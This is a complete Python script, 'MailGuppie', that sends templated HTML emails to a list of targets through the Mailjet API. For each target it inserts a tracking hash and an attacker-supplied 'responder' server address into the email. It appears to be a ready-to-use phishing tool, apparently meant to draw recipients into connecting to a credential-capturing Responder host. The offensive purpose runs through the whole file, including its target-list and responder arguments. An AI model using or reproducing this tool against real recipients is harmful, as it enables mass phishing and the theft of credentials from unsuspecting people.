#!/usr/bin/env python3
"""
MailGuppie - Mailjet API Email Sender
"""

import argparse
import requests
import hashlib
import re
import sys
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime


def generate_sha3_hash(email):
    """Generate SHA3-256 hash and return middle 20 characters"""
    hasher = hashlib.sha3_256()
    hasher.update(email.encode('utf-8'))
    hash_hex = hasher.hexdigest()
    # Extract 20 characters from middle (chars 22-42)
    return hash_hex[22:42]


def extract_domain(email):
    """Extract domain from email address"""
    return email.split('@')[1] if '@' in email else None


def load_api_credentials(key_path):
    """Load API credentials from config file"""
    credentials = {}
    with open(key_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                if ':' in line:
                    key, value = line.split(':', 1)
                    credentials[key.strip()] = value.strip()
    return credentials


def parse_template(template_path):
    """Parse the email template and extract variables"""
    with open(template_path, 'r') as f:
        content = f.read()
    
    # Extract variables section (lines starting with # at the top)
    lines = content.split('\n')
    variables = {}
    template_start = 0
    
    for i, line in enumerate(lines):
        if line.strip().startswith('#'):
            # Parse variable: # VAR_NAME: value
            match = re.match(r'#\s*(\w+):\s*(.+)', line)
            if match:
                var_name, var_value = match.groups()
                variables[var_name.strip()] = var_value.strip()
        elif line.strip() and not line.strip().startswith('#'):
            template_start = i
            break
    
    # Get template content (everything after variables)
    template_html = '\n'.join(lines[template_start:])
    
    return variables, template_html


def replace_template_variables(html, variables, target_email, hash_value):
    """Replace all template variables in the HTML"""
    replacements = {
        '<SHA3_HASH>': hash_value,
        '<TARGET_EMAIL>': target_email,
        **{f'<{k}>': v for k, v in variables.items()}
    }
    
    result = html
    for placeholder, value in replacements.items():
        result = result.replace(placeholder, value)
    
    return result


def send_email(target, api_key, api_secret, sender_email, sender_name, subject, html_template, variables):
    """Send a single email via Mailjet API"""
    try:
        # Generate hash for this target
        hash_value = generate_sha3_hash(target)
        
        # Replace template variables
        html_body = replace_template_variables(html_template, variables, target, hash_value)
        
        # Mailjet API endpoint
        url = "https://api.mailjet.com/v3.1/send"
        
        # Mailjet uses JSON format
        data = {
            "Messages": [
                {
                    "From": {
                        "Email": sender_email,
                        "Name": sender_name
                    },
                    "To": [
                        {
                            "Email": target
                        }
                    ],
                    "Subject": subject,
                    "HTMLPart": html_body
                }
            ]
        }
        
        # Send via Mailjet API (uses basic auth with API key and secret)
        response = requests.post(
            url,
            auth=(api_key, api_secret),
            json=data,
            timeout=10
        )
        
        if response.status_code == 200:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[+] Target: {target}\tHash: {hash_value}\tTime: {timestamp}")
            return True, target
        else:
            print(f"[-] Error sending to {target}: {response.status_code} - {response.text}")
            return False, target
            
    except Exception as e:
        print(f"[-] Error sending to {target}: {str(e)}")
        return False, target


def main():
    banner = """
╔════════════════════════════════════════════════╗
║                  MailGuppie                    ║
╚════════════════════════════════════════════════╝

          ><((((º>   ><((((º>   ><((((º>
"""
    
    # Show help if no arguments provided
    if len(sys.argv) == 1:
        print(banner)
        parser = argparse.ArgumentParser(
            usage='%(prog)s -t <targets.txt> -r <responder-ip> [options]',
            formatter_class=argparse.RawDescriptionHelpFormatter
        )
        parser.add_argument('-t', '--targets', required=True, help='Target email list file (.txt)', metavar='<targets.txt>')
        parser.add_argument('-r', '--responder', required=True, help='Responder server IP/hostname', metavar='<responder-ip>')
        parser.add_argument('-c', '--config', default='config/template.conf', help='Template config file (default: config/template.conf)', metavar='<template.conf>')
        parser.print_help()
        return
    
    parser = argparse.ArgumentParser(
        usage='%(prog)s -t <targets.txt> -r <responder-ip> [options]',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-t', '--targets', required=True, help='Target email list file (.txt)', metavar='<targets.txt>')
    parser.add_argument('-r', '--responder', required=True, help='Responder server IP/hostname', metavar='<responder-ip>')
    parser.add_argument('-c', '--config', default='config/template.conf', help='Template config file (default: config/template.conf)', metavar='<template.conf>')
    
    args = parser.parse_args()
    
    print(banner)
    
    # Load API credentials from config/key.conf
    key_path = Path('config/key.conf')
    if not key_path.exists():
        print(f"[-] Error: API key file not found at {key_path}")
        return
    
    credentials = load_api_credentials(key_path)
    if not credentials:
        print(f"[-] Error: Could not load API credentials from {key_path}")
        return
    
    # Get Mailjet credentials
    api_key = credentials.get('API_KEY')
    api_secret = credentials.get('API_SECRET')
    if not api_key or not api_secret:
        print("[-] Error: API_KEY and API_SECRET required in config/key.conf")
        print("    Format: API_KEY:your_key")
        print("            API_SECRET:your_secret")
        return
    
    # Load template from config file
    template_path = Path(args.config)
    if not template_path.exists():
        print(f"[-] Error: Template not found at {template_path}")
        return
    
    print(f"[*] Loading template: {template_path}")
    variables, html_template = parse_template(template_path)
    
    # Add responder from command line argument
    variables['RESPONDER'] = args.responder
    
    # Get required variables from template
    sender_email = variables.get('SENDER')
    sender_name = variables.get('SENDER_NAME', '')
    subject = variables.get('SUBJECT', 'No Subject')
    
    if not sender_email:
        print("[-] Error: SENDER not specified in template")
        return
    
    print(f"[*] Email sender: {sender_name} <{sender_email}>")
    print(f"[*] Email subject: {subject}")
    
    # Read target list
    with open(args.targets, 'r') as f:
        targets = [line.strip() for line in f if line.strip()]
    
    print(f"[*] Loaded {len(targets)} targets")
    print("[*] Starting send...")
    
    # Send emails with thread pool
    success_count = 0
    fail_count = 0
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(
                send_email,
                target,
                api_key,
                api_secret,
                sender_email,
                sender_name,
                subject,
                html_template,
                variables
            ): target for target in targets
        }
        
        for future in as_completed(futures):
            success, target = future.result()
            if success:
                success_count += 1
            else:
                fail_count += 1
    
    print(f"\n[*] Complete! Success: {success_count}, Failed: {fail_count}")


if __name__ == "__main__":
    main()
